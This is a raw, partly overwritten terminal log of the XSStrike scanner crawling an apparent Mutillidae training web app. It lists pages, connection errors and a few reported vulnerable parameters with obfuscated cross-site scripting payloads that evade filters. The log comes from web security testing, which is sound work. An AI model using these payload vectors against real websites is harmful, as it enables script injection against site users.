[97m[~][0m Parsing p%3Fpage-title%3DStyling+with+Mutillidae [0m[97m[~][0m Parsing javascript&colon;alert(1)                [0m[97m[~][0m Parsing index.php?page=xml-validator.php         [0m[97m[~][0m Parsing age=documentation/usage-instructions.php [0m[97m[~][0m Parsing                                          [0m[97m[~][0m Parsing index.php?page=upload-file.php           [0m[97m[~][0m Parsing x.php?page=documentation/change-log.html [0m[97m[~][0m Parsing index.php?page=sqlmap-targets.php        [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=capture-data.php          [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=show-log.php              [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=register.php              [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=text-file-viewer.php      [0m[97m[~][0m Parsing .php?page=site-footer-xss-discussion.php [0m[97m[~][0m Parsing p?page=client-side-control-challenge.php [0m[97m[~][0m Parsing index.php?page=dns-lookup.php            [0m[97m[~][0m Parsing do=toggle-bubble-hints&page=show-log.php [0m[97m[~][0m Parsing index.php?page=set-background-color.php  [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=browser-info.php          [0m[97m[~][0m Parsing ex.php?page=user-agent-impersonation.php [0m[97m[~][0m Parsing -Mutillidae-over-Virtual-Box-network.php [0m[97m[~][0m Parsing ?page=add-to-your-blog.php               [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 10/131 [0m[93m[!][0m Progress: 20/131 [0m[93m[!][0m Progress: 30/131 [0m[93m[!][0m Progress: 40/131 [0m[93m[!][0m Progress: 50/131 [0m[93m[!][0m Progress: 60/131 [0m[93m[!][0m Progress: 70/131 [0m[93m[!][0m Progress: 80/131 [0m[93m[!][0m Progress: 90/131 [0m[93m[!][0m Progress: 100/131 [0m[93m[!][0m Progress: 110/131 [0m[93m[!][0m Progress: 120/131 [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 130/131 [0m[92m[++][91m Vulnerable webpage: [92mhttp://128.198.49.198:8102/mutillidae/index.php[0m [0m
-[92m[++][91m Vector for [92mpage[0m: <HTmL/+/ONmouSeOver%09=%09a=prompt,a()%0dx> [0m
-[93m[!][0m Progress: 131/131 [0m
-
-
-[XSS] https://128.198.49.198:8102/mutillidae/index.php?do=toggle-enforce-ssl
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing tillidae/index.php?do=toggle-enforce-ssl [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 2/2 [0m
-
-
-[XSS] http://128.198.49.198:8102/mutillidae/index.php?popUpNotificationCode=SSLE1
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing ae/index.php?popUpNotificationCode=SSLE1 [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 2/2 [0m
-
-
-[XSS] http://128.198.49.198:8102/mutillidae/hints-page-wrapper.php?level1HintIncludeFile=11
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing age-wrapper.php?level1HintIncludeFile=11 [0m[92m[++][91m Vulnerable webpage: [92mhttp://128.198.49.198:8102/mutillidae/hints-page-wrapper.php[0m [0m
-[92m[++][91m Vector for [92mlevel1HintIncludeFile[0m: <DetaILs%0dontOgGle%09=%09(confirm)()%0dx> [0m
-[93m[!][0m Progress: 2/2 [0m
-
-
-[XSS] http://128.198.49.198:8102/mutillidae/webservices/soap/ws-lookup-dns-record.php?wsdl=
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing ices/soap/ws-lookup-dns-record.php?wsdl= [0m[93m[!][0m Progress: 2/2 [0m
-
-
-[XSS] http://128.198.49.198:8102/mutillidae/includes/pop-up-help-context-generator.php?pagename=php-errors.php
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing xt-generator.php?pagename=php-errors.php [0m[92m[++][91m Vulnerable webpage: [92mhttp://128.198.49.198:8102/mutillidae/includes/pop-up-help-context-generator.php[0m [0m
-[92m[++][91m Vector for [92mpagename[0m: <DETAIlS%09ONtoGgle+=+confirm()%0dx> [0m
-[93m[!][0m Progress: 2/2 [0m
-
-
-[XSS] http://128.198.49.198:8102/mutillidae/index.php?PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing -Mutillidae-over-Virtual-Box-network.php [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=framing.php               [0m[97m[~][0m Parsing hp?page=documentation/setting-up-ssl.php [0m[97m[~][0m Parsing ebservices/soap/ws-lookup-dns-record.php [0m[97m[~][0m Parsing p%3Fpage-title%3DStyling+with+Mutillidae [0m[97m[~][0m Parsing page=home.php&popUpNotificationCode=HPH0 [0m[97m[~][0m Parsing index.php?page=phpinfo.php               [0m[97m[~][0m Parsing index.php?page=pen-test-tool-lookup.php  [0m[97m[~][0m Parsing framer.html                              [0m[97m[~][0m Parsing index.php?page=user-info.php             [0m[97m[~][0m Parsing index.php?page=user-info-xpath.php       [0m[97m[~][0m Parsing ./webservices/rest/ws-user-account.php   [0m[97m[~][0m Parsing ?page=source-viewer.php                  [0m[97m[~][0m Parsing page=./documentation/vulnerabilities.php [0m[97m[~][0m Parsing index.php?page=source-viewer.php         [0m[97m[~][0m Parsing index.php?page=robots-txt.php            [0m[97m[~][0m Parsing ?page=text-file-viewer.php               [0m[97m[~][0m Parsing index.php?page=captured-data.php         [0m[97m[~][0m Parsing ndex.php?page=back-button-discussion.php [0m[97m[~][0m Parsing index.php?page=repeater.php              [0m[97m[~][0m Parsing index.php?page=show-log.php              [0m[97m[~][0m Parsing set-up-database.php                      [0m[97m[~][0m Parsing ?page=credits.php                        [0m[97m[~][0m Parsing index.php?page=login.php                 [0m[97m[~][0m Parsing index.php?page=user-poll.php             [0m[97m[~][0m Parsing index.php?page=credits.php               [0m[97m[~][0m Parsing x.php?page=documentation/change-log.html [0m[97m[~][0m Parsing ?page=show-log.php                       [0m[97m[~][0m Parsing age=documentation/usage-instructions.php [0m[97m[~][0m Parsing ?page=add-to-your-blog.php               [0m[97m[~][0m Parsing l&page=/var/www/html/mutillidae/home.php [0m[97m[~][0m Parsing ./index.php?page=usage-instructions.php  [0m[97m[~][0m Parsing index.php                                [0m[97m[~][0m Parsing -Mutillidae-over-Virtual-Box-network.php [0m[97m[~][0m Parsing -Mutillidae-over-Virtual-Box-network.php [0m[97m[~][0m Parsing index.php?page=register.php              [0m[97m[~][0m Parsing index.php?page=browser-info.php          [0m[97m[~][0m Parsing ./webservices/soap/ws-hello-world.php    [0m[97m[~][0m Parsing ./index.php?page=installation.php        [0m[97m[~][0m Parsing .php?page=site-footer-xss-discussion.php [0m[97m[~][0m Parsing gename=/var/www/html/mutillidae/home.php [0m[97m[~][0m Parsing p?page=client-side-control-challenge.php [0m[97m[~][0m Parsing index.php?page=framer.html               [0m[97m[~][0m Parsing index.php?page=client-side-comments.php  [0m[97m[~][0m Parsing index.php?page=set-background-color.php  [0m[97m[~][0m Parsing p?page=documentation/vulnerabilities.php [0m[97m[~][0m Parsing index.php?page=cache-control.php         [0m[97m[~][0m Parsing ex.php?page=arbitrary-file-inclusion.php [0m[97m[~][0m Parsing .php&iv=6bc24fc1ab650b25b4114e93a98f1eba [0m[97m[~][0m Parsing index.php?page=directory-browsing.php    [0m[97m[~][0m Parsing                                          [0m[97m[~][0m Parsing index.php?page=dns-lookup.php            [0m[97m[~][0m Parsing index.php?page=text-file-viewer.php      [0m[97m[~][0m Parsing y&page=/var/www/html/mutillidae/home.php [0m[97m[~][0m Parsing ./webservices/soap/ws-user-account.php   [0m[97m[~][0m Parsing x.php?page=pen-test-tool-lookup-ajax.php [0m[97m[~][0m Parsing index.php?page=ssl-misconfiguration.php  [0m[97m[~][0m Parsing index.php?page=html5-storage.php         [0m[97m[~][0m Parsing ./index.php?page=php-errors.php          [0m[97m[~][0m Parsing index.php?page=upload-file.php           [0m[97m[~][0m Parsing index.php?page=installation.php          [0m[97m[~][0m Parsing s&page=/var/www/html/mutillidae/home.php [0m[97m[~][0m Parsing php?page=secret-administrative-pages.php [0m[97m[~][0m Parsing index.php?page=capture-data.php          [0m[97m[~][0m Parsing index.php?page=add-to-your-blog.php      [0m[97m[~][0m Parsing index.php?page=privilege-escalation.php  [0m[97m[~][0m Parsing assword-generator.php&username=anonymous [0m[97m[~][0m Parsing index.php?page=sqlmap-targets.php        [0m[97m[~][0m Parsing index.php?page=view-someones-blog.php    [0m[97m[~][0m Parsing ex.php?page=user-agent-impersonation.php [0m[97m[~][0m Parsing x.php?page=documentation/change-log.html [0m[97m[~][0m Parsing index.php?page=phpmyadmin.php            [0m[97m[~][0m Parsing index.php?page=xml-validator.php         [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 10/138 [0m[93m[!][0m Progress: 20/138 [0m[93m[!][0m Progress: 30/138 [0m[93m[!][0m Progress: 40/138 [0m[93m[!][0m Progress: 50/138 [0m[93m[!][0m Progress: 60/138 [0m[93m[!][0m Progress: 70/138 [0m[93m[!][0m Progress: 80/138 [0m[93m[!][0m Progress: 90/138 [0m[93m[!][0m Progress: 100/138 [0m[93m[!][0m Progress: 110/138 [0m[93m[!][0m Progress: 120/138 [0m[93m[!][0m Progress: 130/138 [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 138/138 [0m
-
-
-[XSS] http://128.198.49.198:8102/mutillidae/index.php?iv=6bc24fc1ab650b25b4114e93a98f1eba
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing .php?iv=6bc24fc1ab650b25b4114e93a98f1eba [0m[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 2/2 [0m
-
-
-[XSS] https://128.198.49.198:8102/mutillidae/index.php?username=anonymous
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing mutillidae/index.php?username=anonymous  [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 2/2 [0m
-
-
-[XSS] https://128.198.49.198:8102/mutillidae/index.php?page-to-frame=styling.php?page-title=Styling with Mutillidae
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing g.php?page-title=Styling with Mutillidae [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 2/2 [0m
-
